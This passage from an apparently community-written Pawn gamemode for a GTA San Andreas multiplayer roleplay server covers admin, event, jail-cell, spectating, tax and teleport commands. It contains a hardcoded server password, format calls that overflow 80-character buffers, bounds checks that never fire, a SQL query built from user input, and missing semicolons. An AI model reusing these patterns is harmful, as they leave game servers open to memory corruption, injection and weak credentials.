            if(PINFO[playerid][cMod9] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod9]);
            if(PINFO[playerid][cMod10] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod10]);
            if(PINFO[playerid][cMod11] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod11]);
            if(PINFO[playerid][cMod12] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod12]);
            if(PINFO[playerid][cMod13] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod13]);
            if(PINFO[playerid][cMod14] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod14]);
            if(PINFO[playerid][cMod15] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod15]);
            if(PINFO[playerid][cMod16] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod16]);
            if(PINFO[playerid][cMod17] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod17]);
            if(PINFO[playerid][cPaintJob] != 3) ChangeVehiclePaintjob(veh, 3);
            PlayerInfo[playerid][cMod1] = 0;
            SaveKonVal(playerid, "cMod1", 0);
            PlayerInfo[playerid][cMod3] = 0;
            SaveKonVal(playerid, "cMod3", 0);
            PlayerInfo[playerid][cMod4] = 0;
            SaveKonVal(playerid, "cMod4", 0);
            PlayerInfo[playerid][cMod5] = 0;
            SaveKonVal(playerid, "cMod5", 0);
            PlayerInfo[playerid][cMod6] = 0;
            SaveKonVal(playerid, "cMod6", 0);
            PlayerInfo[playerid][cMod7] = 0;
            SaveKonVal(playerid, "cMod7", 0);
            PlayerInfo[playerid][cMod8] = 0;
            SaveKonVal(playerid, "cMod8", 0);
            PlayerInfo[playerid][cMod9] = 0;
            SaveKonVal(playerid, "cMod9", 0);
            PlayerInfo[playerid][cMod10] = 0;
            SaveKonVal(playerid, "cMod10", 0);
            PlayerInfo[playerid][cMod11] = 0;
            SaveKonVal(playerid, "cMod11", 0);
            PlayerInfo[playerid][cMod12] = 0;
            SaveKonVal(playerid, "cMod12", 0);
            PlayerInfo[playerid][cMod13] = 0;
            SaveKonVal(playerid, "cMod13", 0);
            PlayerInfo[playerid][cMod14] = 0;
            SaveKonVal(playerid, "cMod14", 0);
            PlayerInfo[playerid][cMod15] = 0;
            SaveKonVal(playerid, "cMod15", 0);
            PlayerInfo[playerid][cMod16] = 0;
            SaveKonVal(playerid, "cMod16", 0);
            PlayerInfo[playerid][cMod17] = 0;
            SaveKonVal(playerid, "cMod17", 0);
            PlayerInfo[playerid][cPaintJob] = 3;
            SaveKonVal(playerid, "cPaintJob", 3);
            SCM(playerid,COLOR_GREEN,"All tunings Removed from vehicle.");
            return 1;
        }
        else if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar_2])
        {
            new veh = PINFO[playerid][pCar_2];
            if(GetPlayerVehicleID(playerid) != veh) return SCM(playerid,COLOR_ALI,"You must be in your personal car to remove tuning.");
            if(PINFO[playerid][cMod1_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod1_2]);
            if(PINFO[playerid][cMod3_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod3_2]);
            if(PINFO[playerid][cMod4_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod4_2]);
            if(PINFO[playerid][cMod5_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod5_2]);
            if(PINFO[playerid][cMod6_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod6_2]);
            if(PINFO[playerid][cMod7_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod7_2]);
            if(PINFO[playerid][cMod8_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod8_2]);
            if(PINFO[playerid][cMod9_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod9_2]);
            if(PINFO[playerid][cMod10_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod10_2]);
            if(PINFO[playerid][cMod11_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod11_2]);
            if(PINFO[playerid][cMod12_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod12_2]);
            if(PINFO[playerid][cMod13_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod13_2]);
            if(PINFO[playerid][cMod14_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod14_2]);
            if(PINFO[playerid][cMod15_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod15_2]);
            if(PINFO[playerid][cMod16_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod16_2]);
            if(PINFO[playerid][cMod17_2] != 0) RemoveVehicleComponent(veh,PINFO[playerid][cMod17_2]);
            if(PINFO[playerid][cPaintJob_2] != 3) ChangeVehiclePaintjob(veh, 3);
            PlayerInfo[playerid][cMod1_2] = 0;
            SaveKonVal(playerid, "cMod1_2", 0);
            PlayerInfo[playerid][cMod3_2] = 0;
            SaveKonVal(playerid, "cMod3_2", 0);
            PlayerInfo[playerid][cMod4_2] = 0;
            SaveKonVal(playerid, "cMod4_2", 0);
            PlayerInfo[playerid][cMod5_2] = 0;
            SaveKonVal(playerid, "cMod5_2", 0);
            PlayerInfo[playerid][cMod6_2] = 0;
            SaveKonVal(playerid, "cMod6_2", 0);
            PlayerInfo[playerid][cMod7_2] = 0;
            SaveKonVal(playerid, "cMod7_2", 0);
            PlayerInfo[playerid][cMod8_2] = 0;
            SaveKonVal(playerid, "cMod8_2", 0);
            PlayerInfo[playerid][cMod9_2] = 0;
            SaveKonVal(playerid, "cMod9_2", 0);
            PlayerInfo[playerid][cMod10_2] = 0;
            SaveKonVal(playerid, "cMod10_2", 0);
            PlayerInfo[playerid][cMod11_2] = 0;
            SaveKonVal(playerid, "cMod11_2", 0);
            PlayerInfo[playerid][cMod12_2] = 0;
            SaveKonVal(playerid, "cMod12_2", 0);
            PlayerInfo[playerid][cMod13_2] = 0;
            SaveKonVal(playerid, "cMod13_2", 0);
            PlayerInfo[playerid][cMod14_2] = 0;
            SaveKonVal(playerid, "cMod14_2", 0);
            PlayerInfo[playerid][cMod15_2] = 0;
            SaveKonVal(playerid, "cMod15_2", 0);
            PlayerInfo[playerid][cMod16_2] = 0;
            SaveKonVal(playerid, "cMod16_2", 0);
            PlayerInfo[playerid][cMod17_2] = 0;
            SaveKonVal(playerid, "cMod17_2", 0);
            PlayerInfo[playerid][cPaintJob_2] = 3;
            SaveKonVal(playerid, "cPaintJob_2", 3);
            SCM(playerid,COLOR_GREEN,"All tunings Removed from vehicle.");
            return 1;
        }
        else return SCM(playerid,COLOR_ALI,"You must be sit on your vehicle to sell it.");
    }

    if(!strcmp(cmd,"/resetsvs",true))
    {
        if(PINFO[playerid][pAdmin] <= 2000) return SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
        new string[256];
        SaveAccounts();
        format(string, sizeof string, "%s has been requested for server exit.",PINFO[playerid][pName]);
        AdminWarn(string);
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i)) KickWithMessage(i, COLOR_GREEN, "[This server is restarting ...]");
        }
        SendRconCommand("hostname Virtual Life iran: [Server is restarting ...]");
        SendRconCommand("password 123zxcvbnm");
        SetTimer("SVExitKon", 4000, 0);
        return 1;
    }

	// Edit //
    if(!strcmp(cmd,"/gmx",true))
    {
        if(PINFO[playerid][pAdmin] <= 1346) return SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
        new string[256];
        SaveAccounts();
        format(string, sizeof string, "%s has been requested for server exit.",PINFO[playerid][pName]);
        AdminWarn(string);
        for(new i;i<LastPID;i++)
        {
        }
		SCM(playerid,COLOR_ALI,"Kami Sabr Konid ... /q Nakonid");
        SendRconCommand("gmx");
        return 1;
    }
// End Edit //
    if(!strcmp(cmd,"/changenick",true))
    {
        if(PINFO[playerid][pAdmin] <= 10) return SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /changenick <PlayerID/PartOfName> <NewName>");
        new taraf = ReturnUser(tmp);
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /changenick <PlayerID/PartOfName> <NewName>");
        if(FindBadSign(tmp)) return SCM(playerid,COLOR_GG,"Use A-Z a-z 0-9 in NewName");
        gPlayerLogged[taraf] = 0;
        RequestSelected[taraf] = true;
        new query[300];
        format(query,300,"SELECT * FROM `users` WHERE pName='%s'",tmp);
        mysql_function_query(handle,query,true,"OnPlayerChangeName","iiss",playerid,taraf,PINFO[taraf][pName],tmp);
        return 1;
    }
    if(!strcmp(cmd,"/ajoin",true))
		{
			if(IsPlayerConnected(playerid))
			{
				if(PINFO[playerid][pAdmin] < 1) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
				if(EventHave == false) return SCM(playerid,COLOR_BLUE,"There isn't any event.");
				if(EventGotoHave == true)
				{
					SCM(playerid,COLOR_BLUE,"Event Teleport Already Added.");
				}
				else
				{
					GetPlayerPos(playerid, Teleportevent[0],Teleportevent[1],Teleportevent[2]);
					Telportevent[0] = GetPlayerVirtualWorld(playerid);
					Telportevent[1] = GetPlayerInterior(playerid);
					Telportevent[2] = Mahal[playerid];
					Telportevent[3] = TooHouse[playerid];
					Telportevent[4] = TooBiz[playerid];
					new string[80];
					format(string,256,"{5d8cdf}Admin Event {ff5500}%s{5d8cdf} Added Event Teleport (Type: {57e547}/JoinEvent{5d8cdf}).",PINFO[playerid][pName]);
					EventSay(COLOR_EVENT,string);
					EventGotoHave = true;
				}
			}
			return 1;
		}
		if(!strcmp(cmd,"/cjoin",true))
		{
			if(IsPlayerConnected(playerid))
			{
				if(PINFO[playerid][pAdmin] < 1) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
				if(EventGotoHave == false) return SCM(playerid,COLOR_BLUE,"Event Teleport NotFound.");
				new string[80];
				format(string,256,"{5d8cdf}Admin {ff5500}%s{5d8cdf} Removed Event Teleport.",PINFO[playerid][pName]);
				EventSay(COLOR_EVENT,string);
				EventGotoHave = false;
			}
			return 1;
		}
		if(!strcmp(cmd,"/JoinEvent",true))
		{
			if(IsPlayerConnected(playerid))
			{
				if(EventHave == false) return SCM(playerid,COLOR_EVENT,"There isn't any event.");
				if(EventGotoHave == false) return SCM(playerid,COLOR_EVENT,"There isn't any Event Teleport.");
				SetPlayerPos(playerid, Teleportevent[0],Teleportevent[1],Teleportevent[2]);
				SetPlayerVirtualWorld(playerid,Telportevent[0]);
				SetPlayerInterior(playerid,Telportevent[1]);
				Mahal[playerid] = Telportevent[2];
				TooHouse[playerid] = Telportevent[3];
				TooBiz[playerid] = Telportevent[4];
				new strings[512];
				format(strings, sizeof(strings), "You have been teleported To Event");
			}
			return 1;
		}
    if(strcmp(cmd, "/aaevent", true) == 0 || strcmp(cmd, "/ae", true) == 0)
    {
        if(PINFO[playerid][pAdmin] < 1) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        if(EventHave == true) return SCM(playerid,COLOR_EVENT,"An event already is on going.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /aaevent <EventID>");
        new event = strval(tmp);
        if(EventIDUsed[event] == false) return SCM(playerid,COLOR_ALI,"INVALID EVENT ID");
        if(IsPlayerConnected(EventIDOrg[event]) && gPlayerLogged[EventIDOrg[event]] == 1)
        {
            EventHave = true;
            EventOrg = EventIDOrg[event];
            new string[256];
            format(string,256,"Admin %s has been accepted your event.",PINFO[playerid][pName]);
            SCM(EventOrg,COLOR_EVENT,string);
            format(string,256,"Admin %s has been accepted %s's event.",PINFO[playerid][pName],PINFO[EventOrg][pName]);
            AdminWarn(string);
            format(string,256,"Event: Title: %s, Prize: $%s, Location: %s, Time: %s",EventTitle[EventOrg],FormatNumber(EventReward[EventOrg]),EventLocation[EventOrg],EventTime[EventOrg]);
            EventSay(COLOR_YELLOW,string);
            format(string,256,"Event: Organizer: %s, Description: %s",PINFO[EventOrg][pName],EventDesc[EventOrg]);
            EventSay(COLOR_YELLOW,string);
            return 1;
        }
        else return SCM(playerid,COLOR_ALI,"Event Organizer isn't connected, report it to Owners");
    }
    if(!strcmp(cmd,"/stopevent",true))
    {
        if(EventHave == false) return SCM(playerid,COLOR_EVENT,"There isn't any event.");
        if(playerid != EventOrg && PINFO[playerid][pAdmin] < 3) return SCM(playerid,COLOR_EVENT,"You are not a Event Organizer.");
        EventHave = false;
        EventIDUsed[EventID[EventOrg]] = false;
        EventIDOrg[EventID[EventOrg]] = INVALID_PLAYER_ID;
        EventSay(COLOR_YELLOW,"Event over");
        EventReward[EventOrg] = 0;
        strmid(EventTime[EventOrg],"00:00",0,strlen("00:00"),20);
        strmid(EventLocation[EventOrg],"HichJa",0,strlen("HichJa"),60);
        strmid(EventDesc[EventOrg],"KooFT",0,strlen("KooFT"),80);
        strmid(EventTitle[EventOrg],"Hichi",0,strlen("Hichi"),60);
        EventID[EventOrg] = 9999;
        EventOrg = INVALID_PLAYER_ID;
        return 1;
    }
	if(!strcmp(cmd,"/hitoall",true))
    {
        if(playerid != EventOrg) return SCM(playerid,COLOR_EVENT,"Shoma Event Organizer Nistid.");
        new string[80];
        format(string,256,"{BBF060}Event organizer {4179E9}%s: {6F9BF2}Salam Be Player Haye SerVer {57e547}JoKeR GaminG {FFFFFF}.",PINFO[playerid][pName]);
        EventSay(COLOR_EVENT,string);
        return 1;
    }
    if(!strcmp(cmd,"/e",true))
    {
        if(playerid != EventOrg) return SCM(playerid,COLOR_EVENT,"Shoma Event Organizer Nistid.");
        new loll[256];
        loll = strtokEx(cmdtext,idx);
        if(!strlen(loll)) return SCM(playerid,COL_SYN,"Syntax: /e <EventChat>");
        new string[80];
        format(string,256,"{BBF060}Event organizer {4179E9}%s: {6F9BF2}%s",PINFO[playerid][pName],loll);
        EventSay(COLOR_EVENT,string);
        return 1;
    }
    if(!strcmp(cmd,"/event",true))
    {
        if(EventHave == false) return SCM(playerid,COLOR_ALI,"There isn't any event on gonig.");
        new string[256];
        format(string,256,"Event: Title: %s, Prize: $%s, Location: %s, Time: %s",EventTitle[EventOrg],FormatNumber(EventReward[EventOrg]),EventLocation[EventOrg],EventTime[EventOrg]);
        SCM(playerid,COLOR_YELLOW,string);
        format(string,256,"Event: Organizer: %s, Description: %s",PINFO[EventOrg][pName],EventDesc[EventOrg]);
        SCM(playerid,COLOR_YELLOW,string);
        if(TogEvent[playerid] == true) SCM(playerid,COLOR_ALI,"Warning: Your Event Tog is disable, to get last information about events Enable it(use /togevent)");
        return 1;
    }
    if(!strcmp(cmd,"/punish",true))
    {
        if(PINFO[playerid][pMember] != 3 && PINFO[playerid][pLeader] != 3) return SCM(playerid,COLOR_BLUE,"You are not a national guard member.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /punish <PlayerID/PartOfName>");
        new user = ReturnUser(tmp);
        if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_ALI,"Player is not connected.");
        if(PINFO[user][pJailTime] <= 0) return SCM(playerid,COLOR_ALI,"That player isn't a prisoner");
        new ali = random(sizeof(InJail));
        SetPlayerPosEx(user, InJail[ali][0] , InJail[ali][1] , InJail[ali][2]);
        TogglePlayerControllable(user,0);
        PlayerCuffedTime[user] = 300;
        new string[256];
        format(string,256,"You have been punished by guard %s for 300 seconds.",PINFO[playerid][pName]);
        SCM(user,COLOR_Good,string);
        SetPlayerInterior(user, 1);
        return 1;
    }
    if(!strcmp(cmd,"/opencell",true))
    {
        if(PINFO[playerid][pLeader] != 3 && PINFO[playerid][pMember] != 3 && PINFO[playerid][pLeader] != 20 && PINFO[playerid][pMember] != 20) return SCM(playerid,COLOR_BLUE,"You are not a national guard or SFPD member.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /opencell <CellID>");
        new cell = strval(tmp);
        if(cell <= 0 && cell >= 37) return SCM(playerid,COLOR_ALI,"We've got 36 cells on jail type a number between 1 and 36");
        if(!IsPlayerInRangeOfPoint(playerid,4,BiroonJail[cell][0],BiroonJail[cell][1],BiroonJail[cell][2])) return SCM(playerid,COLOR_ALI,"You must be near this cell to open it.");
        if(ZendanInfo[cell][ciOpened] == true) return SCM(playerid,COLOR_ALI,"This cell is already opened.");
        MoveObject(ZendanInfo[cell][ciObjID],ZendanInfo[cell][CellOpenx],ZendanInfo[cell][CellOpenY],ZendanInfo[cell][CellOpenZ],3,ZendanInfo[cell][CellOpenRotX],ZendanInfo[cell][CellOpenRotY],ZendanInfo[cell][CellOpenRotZ]);
        new strlol[256];
        format(strlol,256,"Cell %i has been opened.",cell);
        SCM(playerid,COLOR_GG,strlol);
        format(strlol,256,"Cell: %i\n Use /closecell %i to close this cell.",cell,cell);
        UpdateDynamic3DTextLabelText(ZendanInfo[cell][ci3D],COLOR_WHITE,strlol);
        ZendanInfo[cell][ciOpened] = true;
        return 1;
    }
    if(!strcmp(cmd,"/closecell",true))
    {
        if(PINFO[playerid][pLeader] != 3 && PINFO[playerid][pMember] != 3 && PINFO[playerid][pLeader] != 20 && PINFO[playerid][pMember] != 20) return SCM(playerid,COLOR_BLUE,"You are not a national guard or SFPD member.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /closecell <CellID>");
        new cell = strval(tmp);
        if(cell <= 0 && cell >= 37) return SCM(playerid,COLOR_ALI,"We've got 36 cells on jail type a number between 1 and 36");
        if(!IsPlayerInRangeOfPoint(playerid,4,BiroonJail[cell][0],BiroonJail[cell][1],BiroonJail[cell][2])) return SCM(playerid,COLOR_ALI,"You must be near this cell to close it.");
        if(ZendanInfo[cell][ciOpened] == false) return SCM(playerid,COLOR_ALI,"This cell is already closed.");
        MoveObject(ZendanInfo[cell][ciObjID],ZendanInfo[cell][CellCloseX],ZendanInfo[cell][CellCloseY],ZendanInfo[cell][CellCloseZ],3,ZendanInfo[cell][CellCloseRotX],ZendanInfo[cell][CellCloseRotY],ZendanInfo[cell][CellCloseRotZ]);
        new strlol[256];
        format(strlol,256,"Cell %i has been Closed.",cell);
        SCM(playerid,COLOR_GG,strlol);
        format(strlol,256,"Cell: %i\n Use /opencell %i to open this cell.",cell,cell);
        UpdateDynamic3DTextLabelText(ZendanInfo[cell][ci3D],COLOR_WHITE,strlol);
        ZendanInfo[cell][ciOpened] = false;
        return 1;
    }
    if(!strcmp(cmd,"/openallcells",true))
    {
      if(PINFO[playerid][pLeader] != 3 && PINFO[playerid][pMember] != 3) return SCM(playerid,COLOR_BLUE,"You are not a national guard member.");
      if(!IsPlayerInRangeOfPoint(playerid,4,1761.950073,-1542.098510,1993.670043)) return SCM(playerid,COLOR_ALI,"You must be near jail control panel.");
      if(allcell == true) return SCM(playerid,COLOR_ALI,"All cells is already opened.");
      new strlol[256];
      for(new cell = 1;cell<37;cell++)
      {
        MoveObject(ZendanInfo[cell][ciObjID],ZendanInfo[cell][CellOpenx],ZendanInfo[cell][CellOpenY],ZendanInfo[cell][CellOpenZ],3,ZendanInfo[cell][CellOpenRotX],ZendanInfo[cell][CellOpenRotY],ZendanInfo[cell][CellOpenRotZ]);
        format(strlol,256,"Cell: %i\n Use /closecell %i to close this cell.",cell,cell);
        UpdateDynamic3DTextLabelText(ZendanInfo[cell][ci3D],COLOR_WHITE,strlol);
        ZendanInfo[cell][ciOpened] = true;
      }
      allcell = true;
      SCM(playerid,COLOR_GG,"All cells has been opened seccussfully");
      UpdateDynamic3DTextLabelText(OAC3D,COLOR_WHITE,"Jail Control Panel\nUse /closeallcells to close all cells");
      return 1;
    }
    if(!strcmp(cmd,"/openyard",true))
    {
      if(PINFO[playerid][pLeader] != 20 && PINFO[playerid][pMember] != 20) return SCM(playerid,COLOR_SFPD,"You are not a san fiero pd member.");
      if(!IsPlayerInRangeOfPoint(playerid,4,1761.97375, -1564.09131, 2000.41626)) return SCM(playerid,COLOR_ALI,"You must be near jail control panel.");
      if(yardopen == 1) return SCM(playerid,COLOR_ALI,"Yard is already opened.");

      SCM(playerid,COLOR_GG,"Yard has been opened seccussfully");
      UpdateDynamic3DTextLabelText(OXRR,COLOR_WHITE,"Yard Control Panel\nUse /closeyard to close yard");
	  yardopen = 1;
	  return 1;
    }
    if(!strcmp(cmd,"/closeyard",true))
    {
      if(PINFO[playerid][pLeader] != 20 && PINFO[playerid][pMember] != 20) return SCM(playerid,COLOR_SFPD,"You are not a san fiero pd member.");
      if(!IsPlayerInRangeOfPoint(playerid,4,1761.97375, -1564.09131, 2000.41626)) return SCM(playerid,COLOR_ALI,"You must be near jail control panel.");
      if(yardopen == 0) return SCM(playerid,COLOR_ALI,"Yard is already closed.");

      SCM(playerid,COLOR_GG,"Yard has been closed seccussfully");
      UpdateDynamic3DTextLabelText(OXRR,COLOR_WHITE,"Yard Control Panel\nUse /openyard to open yard");
	  yardopen = 0;
	  for(new i;i < LastPID;i++)
         {
      if(IsPlayerConnected(i) && GetPlayerVirtualWorld(playerid) == 1020304050)
                {
			   SCM(playerid,COLOR_GG,"Sry , Yard closed and you were in yard");
			   SpawnPlayer(i);
                }
            }
			return 1;
    }
    if(!strcmp(cmd,"/closeallcells",true))
    {
      if(PINFO[playerid][pLeader] != 3 && PINFO[playerid][pMember] != 3) return SCM(playerid,COLOR_BLUE,"You are not a national guard member.");
      if(!IsPlayerInRangeOfPoint(playerid,4,1761.950073,-1542.098510,1993.670043)) return SCM(playerid,COLOR_ALI,"You must be near jail control panel.");
      if(allcell == false) return SCM(playerid,COLOR_ALI,"All cells is already closed.");
      new strlol[256];
      for(new cell = 1;cell<37;cell++)
      {
        MoveObject(ZendanInfo[cell][ciObjID],ZendanInfo[cell][CellCloseX],ZendanInfo[cell][CellCloseY],ZendanInfo[cell][CellCloseZ],3,ZendanInfo[cell][CellCloseRotX],ZendanInfo[cell][CellCloseRotY],ZendanInfo[cell][CellCloseRotZ]);
        format(strlol,256,"Cell: %i\n Use /opencell %i to open this cell.",cell,cell);
        UpdateDynamic3DTextLabelText(ZendanInfo[cell][ci3D],COLOR_WHITE,strlol);
        ZendanInfo[cell][ciOpened] = false;
      }
      allcell = false;
      SCM(playerid,COLOR_GG,"All cells has been closed seccussfully.");
      UpdateDynamic3DTextLabelText(OAC3D,COLOR_WHITE,"Jail Control Panel\nUse /openallcells to open all cells");
      return 1;
    }
     if(!strcmp(cmd, "/specplayer", true) || !strcmp(cmd, "/sp", true))
    {
        if(PINFO[playerid][pAdmin] <= 0) return ErrorMessage1(playerid);
        if(Specing[playerid] >= 1) return SCM(playerid,COLOR_GG,"You already on Spectating, you can use /specoff to stop spectating.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /specplayer <PlayerID/PartOfName>");
        new Taraf = ReturnUser(tmp);
        if(PlayerInfo[Taraf][pAdmin] == 1000000) return SCM(playerid,COL_SYN,"Ro Owner Spec Nemishe Kard")
        if(Taraf == playerid) return SCM(playerid,COLOR_Good,"You cannot spec yourself.");
        if(!IsPlayerConnected(Taraf)) return PlayerNotConnected(playerid);
        if(Specing[Taraf] >= 1) return SCM(playerid,COLOR_GG,"That admin is specing someone else.");
        GetPlayerPos(playerid,TelePos2[playerid][0],TelePos2[playerid][1],TelePos2[playerid][2]);
        TelportEtela2[playerid][0] = GetPlayerVirtualWorld(playerid);
        TelportEtela2[playerid][1] = GetPlayerInterior(playerid);
        TelportEtela2[playerid][2] = Mahal[playerid];
        TelportEtela2[playerid][4] = TooBiz[playerid];
        TelportEtela2[playerid][3] = TooHouse[playerid];
        new string[256];
        format(string,256,"{FFFFFF}Admin %s is on spectating %s",PINFO[playerid][pName],PINFO[Taraf][pName]);
	PhoneOnline[playerid] = 0;
	pNoFind[playerid] = 1;
        AdminWarn(string);
        SpecPlayer(playerid,Taraf);
        return 1;
    }
    if(!strcmp(cmd,"/specf",true))
    {
        if(PINFO[playerid][pAdmin] <= 1) return ErrorMessage1(playerid);
        if(Specing[playerid] >= 1) return SCM(playerid,COLOR_GG,"You already on Spectating, you can use /specoff to stop spectating.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /specplayer <PlayerID/PartOfName>");
        new Taraf = ReturnUser(tmp);
        if(PlayerInfo[Taraf][pAdmin] == 1000000) return SCM(playerid,COL_SYN,"Ro Owner Spec Nemishe Kard")
        if(Taraf == playerid) return SCM(playerid,COLOR_Good,"You cannot spec yourself.");
        if(!IsPlayerConnected(Taraf)) return PlayerNotConnected(playerid);
        if(Specing[Taraf] >= 1) return SCM(playerid,COLOR_GG,"That admin is specing someone else.");
        GetPlayerPos(playerid,TelePos2[playerid][0],TelePos2[playerid][1],TelePos2[playerid][2]);
        TelportEtela2[playerid][0] = GetPlayerVirtualWorld(playerid);
        TelportEtela2[playerid][1] = GetPlayerInterior(playerid);
        TelportEtela2[playerid][2] = Mahal[playerid];
        TelportEtela2[playerid][4] = TooBiz[playerid];
        TelportEtela2[playerid][3] = TooHouse[playerid];
		PhoneOnline[playerid] = 0;
        SpecPlayer(playerid,Taraf);
        return 1;
    }
    if(!strcmp(cmd,"/givetax",true))
 {
        if(PINFO[playerid][pLeader] != 7) return SCM(playerid,COLOR_LIGHTGREEN,"You are not The Mayor.");
        if(TaxValue <= 0) return SCM(playerid,COLOR_LIGHTGREEN,"There isn't any tax in Mayor's SafeBox");
        new nafar = 0;
        for(new i = 0;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PINFO[i][pLevel] >= 2 && PINFO[i][pLevel] <= 7 && i != playerid)
                {
                    nafar ++;
                }
            }
        }
        if(nafar == 0) return SCM(playerid,COLOR_ALI,"There's not any (newbie)playerid online.");
        new TaxGive = TaxValue/nafar;
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PINFO[i][pLevel] >= 2 && PINFO[i][pLevel] <= 7 && i != playerid)
                {
                    PINFO[i][pAccount] += TaxGive;
                    SaveKonVal(i, "pAccount", PINFO[i][pAccount]);
                    //SaveAccount(i);
                }
            }
        }
        TaxValue = 0;
        SaveStuff();
        new strlol[512];
        format(strlol,512,"<< Mayor %s gave $%s to %i citizens level 2-7 >>",PINFO[playerid][pName],FormatNumber(TaxGive),nafar);
        SendClientMessageToAll(COLOR_LIGHTRED,strlol);
        return 1;
    }


    if(!strcmp(cmd,"/gotohint",true))
    {
    if(PlayerInfo[playerid][pAdmin] <= 6) return SCM(playerid,COLOR_YELLOW2,"Error: Unknown command.");
    if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_ALI,"Az mashin dar bia baw!");
    tmp = strtok(cmdtext,idx);
    if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /gotohint <Interior ID(1-27)>");
    new numehouse = strval(tmp);
    new Float:entx,Float:enty,Float:entz,inth;
    if(numehouse == 1)
    {
    entx = 2468.365966;
    enty = -1698.416625;
    entz = 1013.507812;
    inth = 2;
    }
    if(numehouse == 2)
    {
    entx = 2495.723876;
    enty = -1693.244995;
    entz = 1014.742187;
    inth = 3;
    }
    if(numehouse == 3)
    {
    entx = 2233.672363;
    enty = -1114.459106;
    entz = 1050.882812;
    inth = 5;
    }
    if(numehouse == 4)
    {
    entx = 2195.893310;
    enty = -1204.445678;
    entz = 1049.023437;
    inth = 6;
    }
    if(numehouse == 5)
    {
    entx = 2317.994384;
    enty = -1025.836425;
    entz = 1050.210937;
    inth = 9;
    }
    if(numehouse == 6)
    {
    entx = 2260.268310;
    enty = -1136.028930;
    entz = 1050.632812;
    inth = 10;
    }
    if(numehouse == 7)
    {
    entx = 235.288238;
    enty = 1187.125488;
    entz = 1080.257812;
    inth = 3;
    }
    if(numehouse == 8)
    {
    entx = 225.314559;
    enty = 1239.864135;
    entz = 1082.140625;
    inth = 2;
    }
    if(numehouse == 9)
    {
    entx = 222.998306;
    enty = 1287.692382;
    entz = 1082.140625;
    inth = 1;
    }
    if(numehouse == 10)
    {
    entx = 226.973403;
    enty = 1114.219360;
    entz = 1080.996459;
    inth = 5;
    }
    if(numehouse == 11)
    {
    entx = 295.228607;
    enty = 1472.994995;
    entz = 1080.257812;
    inth = 15;
    }
    if(numehouse == 12)
    {
    entx = 447.062316;
    enty = 1397.541625;
    entz = 1084.304687;
    inth = 2;
    }
    if(numehouse == 13)
    {
    entx = 226.921157;
    enty = 1114.367797;
    entz = 1080.996093;
    inth = 5;
    }
    if(numehouse == 14)
    {
    entx = 260.931701;
    enty = 1284.655761;
    entz = 1080.257812;
    inth = 4;
    }
    if(numehouse == 15)
    {
    entx = 24.113548;
    enty = 1340.711914;
    entz = 1084.375000;
    inth = 10;
    }
    if(numehouse == 16)
    {
    entx = 221.947799;
    enty = 1140.788696;
    entz = 1082.609375;
    inth = 4;
    }
    if(numehouse == 17)
    {
    entx = 2324.500976;
    enty = -1148.895507;
    entz = 1050.710083;
    inth = 12;
    }
    if(numehouse == 18)
    {
    entx = 22.807277;
    enty = 1403.864746;
    entz = 1084.429687;
    inth = 5;
    }
    if(numehouse == 19)
    {
    entx = 140.445510;
    enty = 1366.469726;
    entz = 1083.859375;
    inth = 5;
    }
    if(numehouse == 20)
    {
    entx = 234.098831;
    enty = 1064.388549;
    entz = 1084.211303;
    inth = 6;
    }
    if(numehouse == 21)
    {
    entx = 2217.460449;
    enty = -1076.410522;
    entz = 1050.484375;
    inth = 1;
    }
    if(numehouse == 22)
    {
    entx = 2365.198974;
    enty = -1135.136596;
    entz = 1050.875000;
    inth = 8;
    }
    if(numehouse == 23)
    {
